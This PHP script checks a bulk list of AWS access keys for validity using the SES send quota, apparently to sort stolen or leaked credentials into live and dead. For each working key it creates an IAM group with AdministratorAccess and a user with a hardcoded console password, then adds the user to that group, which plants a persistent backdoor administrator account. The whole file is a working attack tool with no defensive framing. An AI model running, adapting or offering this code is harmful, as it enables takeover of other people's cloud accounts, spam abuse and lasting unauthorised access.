<?php

error_reporting(0);

require_once 'aws/vendor/autoload.php';



function check($key, $secret, $region){

	$config = array();
	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Ses\SesClient::factory($config);

		$result = $client->getSendQuota([]);

		$result = $result->toArray();

		return $result;

	}

	catch(Exception $e){

		return False;

	}

}



function createGroup($key, $secret, $region){

	$config = array();

	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Iam\IamClient::factory($config);

		$result = $client->createGroup(['GroupName' => 'ADMINASU',]); //ganti nama group nya ADMINASU

		$result = $result->toArray();

		return $result;

	}

	catch(Exception $e){

		return False;

	}

}



function attachGroupPolicy($key, $secret, $region){

	$config = array();

	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Iam\IamClient::factory($config);

		$result = $client->attachGroupPolicy(['GroupName' => 'ADMINASU','PolicyArn' => 'arn:aws:iam::aws:policy/AdministratorAccess',]); //ganti ADMINASU samain dengan yg atas

		$result = $result->toArray();

		return $result;

	}

	catch(Exception $e){

		return False;

	}

}



function createUser($key, $secret, $region){

	$config = array();

	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Iam\IamClient::factory($config);

		$result = $client->createUser(['UserName' => 'fuckid',]); //gan fuckid dengan username yg kalian inginkan

		$result = $result->toArray();

		return $result['User'];

	}

	catch(Exception $e){

		return False;

	}

}



function createLoginProfile($key, $secret, $region){

	$config = array();

	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Iam\IamClient::factory($config);

		$result = $client->createLoginProfile(['Password' => 'faiq+IDX12345678901234','UserName' => 'fuckid',]); //gan username sama password nya

		$result = $result->toArray();

		return $result;

	}

	catch(Exception $e){

		return False;

	}

}



function addUserToGroup($key, $secret, $region){

	$config = array();

	$config['region'] = $region;

	$config['version'] = 'latest';

	$config['credentials'] = array(

		'key'	=> $key,

		'secret'	=> $secret

	);

	try{

		$client = Aws\Iam\IamClient::factory($config);

		$result = $client->addUserToGroup(['GroupName' => 'ADMINASU','UserName' => 'fuckid',]); //ganti username sama groupname nya kayak di atas 

		$result = $result->toArray();

		return $result;

	}

	catch(Exception $e){

		return False;

	}

}

$reglist = [

	'us-east-2',

	'us-east-1',

	'us-west-1',

	'us-west-2',

	'af-south-1',

	'ap-east-1',

	'ap-south-1',

	'ap-northeast-3',

	'ap-northeast-2',

	'ap-southeast-1',

	'ap-southeast-2',

	'ap-northeast-1',

	'ca-central-1',

	'cn-north-1',

	'cn-northwest-1',

	'eu-central-1',

	'eu-west-1',

	'eu-west-2',

	'eu-south-1',

	'eu-west-3',

	'eu-north-1',

	'me-south-1',

	'sa-east-1',

	'us-gov-east-1',

	'us-gov-west-1',

];



echo " ngontol

                                  



";

$fp = fopen("php://stdin","r");

echo "Input your Aws Key List: ";

$awslist = trim(fgets($fp));

fclose($fp);



$awslist = file($awslist);

foreach($awslist as $awskey){

	$line = trim($awskey);

	$aws = explode('|', $line);

	if(count($aws) >= 3){

		$key = trim($aws[0]);

		$sec = trim($aws[1]);

		$reg = trim($aws[2]);

		$result = check($key, $sec, $reg);

		if($result == False){

			$logs = "{$line}|DIE\r\n";

			file_put_contents('Die.txt', $logs, FILE_APPEND);

		}

		else{

			$logs = "{$line}|{$result['SentLast24Hours']}/{$result['Max24HourSend']}";

			$Group = createGroup($key, $sec, $reg);

			$GroupPolicy = attachGroupPolicy($key, $sec, $reg);

			$User = createUser($key, $sec, $reg);

			$logs .= "|[".implode(', ', $User)."]\r\n";

			$LoginProfile = createLoginProfile($key, $sec, $reg);

			$UserToGroup = addUserToGroup($key, $sec, $reg);

			file_put_contents('Live.txt', $logs, FILE_APPEND);

		}

		echo $logs;

	}

}
